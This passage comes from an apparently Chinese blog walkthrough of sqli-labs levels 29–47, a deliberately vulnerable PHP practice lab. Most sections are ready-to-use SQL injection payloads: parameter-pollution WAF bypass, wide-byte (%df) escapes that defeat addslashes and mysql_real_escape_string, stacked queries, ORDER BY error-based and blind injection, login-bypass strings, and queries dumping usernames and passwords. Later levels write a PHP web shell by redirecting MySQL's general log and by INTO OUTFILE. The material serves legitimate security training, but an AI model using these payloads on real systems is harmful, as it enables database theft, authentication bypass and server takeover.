以数字开头，以数字结尾</span></span><br><span class="line">    $match = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, $input);</span><br><span class="line">    <span class="keyword">if</span>($match)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">        <span class="comment">//return $match;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;    </span><br><span class="line">        header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">        <span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制id的长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params">$query_string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    $qs_array= explode(<span class="string">&quot;&amp;&quot;</span>,$q_s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>($val==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">            <span class="keyword">return</span> $id_value;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同时传入两个 id，当前一个 id 被 java_implimentation 捕获的时候（模拟 Tomcat 的解析），第一个 id 就会进入 WAF，如果检测合格则将 GET 参数中的 id 插入 SQL 语句（第二个 id，而不是进入 WAF的 id）。最后的 payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Apache PHP 会解析最后一个参数</li>
<li>Tomcat JSP 会解析第一个参数</li>
</ul>
<hr>
<h2 id="less-30-1"><a href="#less-30-1" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
<p>同第29题，仅闭合方式不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 简单测试一下</span><br><span class="line">?id&#x3D;1&amp;id&#x3D;2&quot; and sleep(3) --+</span><br><span class="line"></span><br><span class="line"># 联合注入</span><br><span class="line">?id&#x3D;1&amp;id&#x3D;0&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p>
<p>同29题，仅拼接方式不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># unino注入</span><br><span class="line">?id&#x3D;1&amp;id&#x3D;0&quot;) union select 1, 2, 3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
<p>关键词：GET、联合注入、报错注入、布尔盲注、延时注入、绕过addslashes</p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;    <span class="comment"># \ 转换为 \\</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, $string); </span><br><span class="line">     <span class="comment"># 将 &#x27; 转为\&quot;</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, $string);   </span><br><span class="line">     <span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, $string);                                </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con1, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>宽字节注入原理：</p>
<ul>
<li>%df吃掉%5c：&#39; 进行url编码后为%5c%27，在%5c%27前添加%df，当MySQL的编码为GBK时（mysqli_query($con1, “SET NAMES gbk”);），%df%5c会被作为一个汉字，%27作为单引号独立，就可以逃脱%5c（\）的限制。</li>
<li>%5c吃掉%5c：将反斜杠作为字符，然后让%27（’）不受前面的%5c限制。（这里无法使用%5c）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 简单测试</span><br><span class="line">?id&#x3D;1%df&#39; and sleep(3)--+</span><br><span class="line"># 有明显延时</span><br><span class="line">?id&#x3D;1%5c&#39; and sleep(3)--+</span><br><span class="line"># 没有延时</span><br><span class="line"></span><br><span class="line"># union注入</span><br><span class="line">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>关键词：绕过 addslashes</p>
<p>类似上一题，不过采用 addslashes 函数添加反斜杠，Payload 同上一题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>addslashes函数转义的字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\   &#x3D;&gt;  \\</span><br><span class="line">&#39;   &#x3D;&gt;  \&#39;</span><br><span class="line">&quot;   &#x3D;&gt;  \&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p>
<p>过滤方法同 less-33</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># union注入</span><br><span class="line">uname&#x3D;admin%df&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;233</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还可以使用 UTF-16 或 UTF-32，效果同<code>%df</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">~ » <span class="built_in">echo</span> \<span class="string">&#x27; | iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » <span class="built_in">echo</span> \<span class="string">&#x27; | iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在 MySQL 中执行的 SQL 语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;�&#39; or 1#and password&#x3D;&#39;$passwd&#39; LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个符号的效果类似于 %df，进行联合注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>闭合方式：<code>id=$id</code></p>
<p>这个关卡不需要使用单引号即可进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>关键词：绕过 mysql_real_escape_string 函数</p>
<p>mysql_real_escape_string 函数类似 addslashes 函数，会对反斜杠、单引号、双引号进行检测并添加转义字符，所以方法和 less-34 一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="line">?id&#x3D;-1�&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p>
<p>关键词：绕过 mysql_real_escape_string 函数</p>
<p>同上一题，GET 方法改为 POST 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uname&#x3D;%df&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="4-堆叠注入-38-53"><a href="#4-堆叠注入-38-53" class="headerlink" title="4 堆叠注入(38-53)"></a>4 堆叠注入(38-53)</h1><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>添加字段值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用 SQL 语句进行查询是否添加成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from users;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>条件：</p>
<ol>
<li>MySQL 开启 load_file()</li>
<li>DNSLog 平台 （Hyuga、CEYE）</li>
<li>Windows 平台</li>
</ol>
<p>无 windows 暂时不测试</p>
<h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>条件：</p>
<ol>
<li>Web 的物理路径</li>
<li>MySQL 可以读写 Web 目录</li>
<li>Windows 成功率 高于 Linux</li>
</ol>
<p>查看本地配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;general%&#39;;</span><br><span class="line">+------------------+-----------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                               |</span><br><span class="line">+------------------+-----------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                 |</span><br><span class="line">| general_log_file | &#x2F;Applications&#x2F;MxSrvs&#x2F;bin&#x2F;mysql&#x2F;data&#x2F;MacBook-Pro.log |</span><br><span class="line">+------------------+-----------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>默认没有开启，尝试手动开启，并配置目录路径（我的项目路径为：/Users/littlechieh6/Documents/project/sqli-labs-php7）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;shell.php&#39;;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再次查看配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;general%&#39;;</span><br><span class="line">+------------------+----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                          |</span><br><span class="line">+------------------+----------------------------------------------------------------+</span><br><span class="line">| general_log      | ON                                                             |</span><br><span class="line">| general_log_file | &#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;shell.php |</span><br><span class="line">+------------------+----------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试 Getshell（运行的 sql 语句会被保存到我刚填写的日志路径，日志路径又在 web 路径之下，故可以得到 web shell）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;select &#39;&lt;?php phpinfo();?&gt;&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>成功获取 phpinfo 信息（同理可以写马）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/6843E733-D786-4480-866B-5CF4A778449A.png"></p>
<h3 id="修改表名查数据"><a href="#修改表名查数据" class="headerlink" title="修改表名查数据"></a>修改表名查数据</h3><p>具体细节搜索：supersqli 题解（攻防世界的题目）。</p>
<hr>
<h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>闭合方式：<code>id=$id</code></p>
<p>同38，闭合方式不同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试payload</span><br><span class="line">?id&#x3D;1 and sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>同38，闭合方式不同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?id&#x3D;1&#39;)--+</span><br><span class="line">?id&#x3D;1&#39;) and sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>闭合方式：<code>id=$id</code></p>
<p>拼接方式和 Less-39 一样。因为少了报错输出，所以这里不能报错注入，其他注入方式一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?id&#x3D;1--+</span><br><span class="line">?id&#x3D;1 and sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>漏洞利用点：</p>
<ol>
<li>login 的 password：没有过滤，可以进行报错注入</li>
<li>堆叠注入</li>
<li>pass_change.php：存在二次注入<br>尝试万能密码（password），post 传参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试（url：http:&#x2F;&#x2F;localhost:4000&#x2F;Less-42&#x2F;login.php）</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; or 1#&amp;mysubmit&#x3D;Login</span><br><span class="line"></span><br><span class="line"># union注入</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit&#x3D;Login</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p>
<p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试（url：http:&#x2F;&#x2F;localhost:4000&#x2F;Less-43&#x2F;login.php）</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;1&#39;) or 1#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>闭合方式：<code>username=&#39;$username&#39;</code></p>
<p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39; #</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39; and sleep(3) #</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p>
<p>和 Less-44 的利用方式一致，这里只是拼接方式不一样而已</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39;) #</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39;) and sleep(3)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p>闭合方式：<code>ORDER BY $id</code></p>
<p>关键词：order by注入</p>
<p>验证方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 升序排序</span><br><span class="line">?sort&#x3D;1 asc</span><br><span class="line"># 降序排序</span><br><span class="line">?sort&#x3D;1 desc</span><br><span class="line"></span><br><span class="line"># rand() 验证</span><br><span class="line">?sort&#x3D;rand(true)</span><br><span class="line">?sort&#x3D;rand(false)</span><br><span class="line"></span><br><span class="line"># 延时验证</span><br><span class="line">?sort&#x3D;sleep(1)</span><br><span class="line">?sort&#x3D;(sleep(1))</span><br><span class="line">?sort&#x3D;1 and sleep(1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错1</span><br><span class="line">?sort&#x3D;1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># 报错2</span><br><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&#39;:&#39;,username,password)+FROM+users limit 0,1))),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>布尔注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>延时注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查询结果导入文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>导入文件写入shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>写入的内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1 Dumb Dumb&lt;?php phpinfo();?&gt;2 Angelina Dumb&lt;?php phpinfo();?&gt;3 Dummy Dumb&lt;?php phpinfo();?&gt;4 secure Dumb&lt;?php phpinfo();?&gt;5 stupid Dumb&lt;?php phpinfo();?&gt;6 superman Dumb&lt;?php phpinfo();?&gt;7 batman Dumb&lt;?php phpinfo();?&gt;8 admin admin&lt;?php phpinfo();?&gt;9 admin1 Dumb&lt;?php phpinfo();?&gt;10 admin2 Dumb&lt;?php phpinfo();?&gt;11 admin3 Dumb&lt;?php phpinfo();?&gt;12 dhakkan Dumb&lt;?php phpinfo();?&gt;14 admin4 Dumb&lt;?php phpinfo();?&gt;15 admin&#39;# admin&lt;?php phpinfo();?&gt;16 hello world&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
<p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 验证</span><br><span class="line"></span><br><span class="line">?sort&#x3D;1&#39; or sleep(3)--+</span><br><span class="line">?sort&#x3D;0&#39; or sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于短路现象，前一个不会发生延时，后一个有明显的延时。</p>
<p>报错注入</p>
